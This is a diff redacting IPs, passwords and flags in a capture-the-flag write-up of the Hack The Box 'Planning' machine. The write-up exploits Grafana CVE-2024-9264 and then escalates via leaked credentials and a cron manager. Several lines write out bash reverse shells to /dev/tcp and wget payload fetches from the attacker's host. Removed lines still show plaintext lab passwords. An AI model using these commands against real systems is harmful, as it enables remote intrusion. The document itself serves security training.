@@ -16,9 +16,9 @@ Author: [d00msl4y3r](https://app.hackthebox.com/users/128944) and [FisMatHack](h
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.237.241
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 10:12 EDT
-Nmap scan report for 10.129.237.241 (10.129.237.241)
+Nmap scan report for 10.129.xx.xx (10.129.xx.xx)
 Host is up (1.1s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -37,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 53.65 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.237.241     planning.htb
+10.129.xx.xx     planning.htb
 ```
 
 Let's check the web server.
@@ -92,7 +92,7 @@ Waiting for a while and we got `grafana.planning.htb` subdomain. <br>
 &rarr; Add it to `/etc/hosts` file.
 
 ```bash
-10.129.237.241     planning.htb grafana.planning.htb
+10.129.xx.xx     planning.htb grafana.planning.htb
 ```
 
 Let's check the `grafana.planning.htb` website.
@@ -180,21 +180,21 @@ We gonna set up a reverse shell listener via [Penelope](https://github.com/brigh
 
 ```bash
 └─$ penelope -p 3333
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
-Then we gonna use this command `bash -i >& /dev/tcp/10.10.16.36/3333 0>&1` for our reverse shell.
+Then we gonna use this command `bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1` for our reverse shell.
 
 ```bash
-└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'bash -i >& /dev/tcp/10.10.16.36/3333 0>&1' http://grafana.planning.htb/     
+└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1' http://grafana.planning.htb/     
 [+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: bash -i >& /dev/tcp/10.10.16.36/3333 0>&1
+[+] Executing command: bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1
 [-] Unexpected response format:
 [-] {
     "results": {
         "B": {
-            "error": "exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process exited with non-zero exit code=\"2\": bash -i >& /dev/tcp/10.10.16.36/3333 0>&1 >/tmp/grafana_cmd_output 2>&1 |\n",
+            "error": "exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process exited with non-zero exit code=\"2\": bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1 >/tmp/grafana_cmd_output 2>&1 |\n",
             "errorSource": "",
             "status": 500,
             "frames": []
@@ -235,7 +235,7 @@ Confirmed that it is available. Let's create a `shell.sh` file.
 ```bash
 └─$ cat shell.sh                                           
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.16.36/3333 0>&1
+bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1
 ```
 
 ```bash
@@ -246,15 +246,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Host the `shell.sh` file on the our kali machine.
 
 ```bash
-└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'wget http://10.10.16.36/shell.sh' http://grafana.planning.htb/
+└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'wget http://10.xx.xx.xx/shell.sh' http://grafana.planning.htb/
 [+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: wget http://10.10.16.36/shell.sh
+[+] Executing command: wget http://10.xx.xx.xx/shell.sh
 [+] Successfully ran duckdb query:
-[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('wget http://10.10.16.36/shell.sh >/tmp/grafana_cmd_output 2>&1 |'):
+[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('wget http://10.xx.xx.xx/shell.sh >/tmp/grafana_cmd_output 2>&1 |'):
 [+] Successfully ran duckdb query:
 [+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
---2025-08-18 15:21:23--  http://10.10.16.36/shell.sh
-Connecting to 10.10.16.36:80... connected.
+--2025-08-18 15:21:23--  http://10.xx.xx.xx/shell.sh
+Connecting to 10.xx.xx.xx:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 54 [text/x-sh]
 Saving to: 'shell.sh'
@@ -267,7 +267,7 @@ Saving to: 'shell.sh'
 ```bash
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.237.241 - - [18/Aug/2025 11:21:23] "GET /shell.sh HTTP/1.1" 200 -
+10.129.xx.xx - - [18/Aug/2025 11:21:23] "GET /shell.sh HTTP/1.1" 200 -
 ```
 
 We successfully download the file.
@@ -297,16 +297,16 @@ Now let's execute it.
 
 ```bash
 └─$ penelope -p 3333
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from 7ce659d667d7~10.129.237.241-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from 7ce659d667d7~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [!] Python agent cannot be deployed. I need to maintain at least one basic session to handle the PTY
-[+] Attempting to spawn a reverse shell on 10.10.16.36:3333
-[+] Got reverse shell from 7ce659d667d7~10.129.237.241-Linux-x86_64 😍 Assigned SessionID <2>
+[+] Attempting to spawn a reverse shell on 10.xx.xx.xx:3333
+[+] Got reverse shell from 7ce659d667d7~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <2>
 [+] Shell upgraded successfully using /usr/bin/script! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/7ce659d667d7~10.129.237.241-Linux-x86_64/2025_08_18-11_22_01-499.log 📜
+[+] Logging to /home/kali/.penelope/7ce659d667d7~10.129.xx.xx-Linux-x86_64/2025_08_18-11_22_01-499.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 root@7ce659d667d7:~# ls -la
 total 76
@@ -464,7 +464,7 @@ We can see that it's a bash script that is used to run the Grafana server. The t
 root@7ce659d667d7:/# env | grep "^GF_"
 GF_PATHS_HOME=/usr/share/grafana
 GF_PATHS_PROVISIONING=/etc/grafana/provisioning
-GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntxxxx
 GF_SECURITY_ADMIN_USER=enzo
 GF_PATHS_DATA=/var/lib/grafana
 GF_PATHS_LOGS=/var/log/grafana
@@ -472,12 +472,12 @@ GF_PATHS_PLUGINS=/var/lib/grafana/plugins
 GF_PATHS_CONFIG=/etc/grafana/grafana.ini
 ```
 
-Got more credentials `enzo:RioTecRANDEntANT!`. <br>
+Got more credentials `enzo:RioTecRANDEntxxxx`. <br>
 &rarr; Let's `ssh` into `enzo` user.
 
 ```bash
-└─$ ssh enzo@10.129.237.241            
-enzo@10.129.237.241's password: 
+└─$ ssh enzo@10.129.xx.xx            
+enzo@10.129.xx.xx's password: 
 enzo@planning:~$ ls -la
 total 32
 drwxr-x--- 4 enzo enzo 4096 Apr  3 13:49 .
@@ -490,7 +490,7 @@ drwx------ 2 enzo enzo 4096 Apr  3 13:49 .cache
 drwx------ 2 enzo enzo 4096 Feb 28 16:22 .ssh
 -rw-r----- 1 root enzo   33 Aug 18 13:49 user.txt
 enzo@planning:~$ cat user.txt
-6ae53fd6e69c98e2f7192c78909e3350
+6ae53fxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab that `user.txt` flag.
@@ -521,11 +521,11 @@ After going through, we found out `crontab.db`.
 
 ```bash
 enzo@planning:/opt/crontabs$ strings crontab.db
-{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
+{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pxxxxxx /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
 {"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
 ```
 
-Found out other credentials `P4ssw0rdS0pRi0T3c`. <br>
+Found out other credentials `P4ssw0rdS0pxxxxxx`. <br>
 Now let's port forwarding `8000`.
 
 ```bash
@@ -536,7 +536,7 @@ enzo@planning:~$
 
 ![Planning Port Forwarding](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_port-forwarding.png)
 
-Enter the credentials `root:P4ssw0rdS0pRi0T3c`.
+Enter the credentials `root:P4ssw0rdS0pxxxxxx`.
 
 ![Planning Port Forwarding](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_port-forwarding-2.png)
 
@@ -614,7 +614,7 @@ drwxr-xr-x  4 root root 4096 Feb 28 19:01 .npm
 drwxr-xr-x  2 root root 4096 Apr  3 12:54 scripts
 drwx------  2 root root 4096 Feb 28 16:22 .ssh
 bash-5.2# cat root.txt
-349832e741e351d7b08334050d294b2b
+349832xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `root.txt` flag.
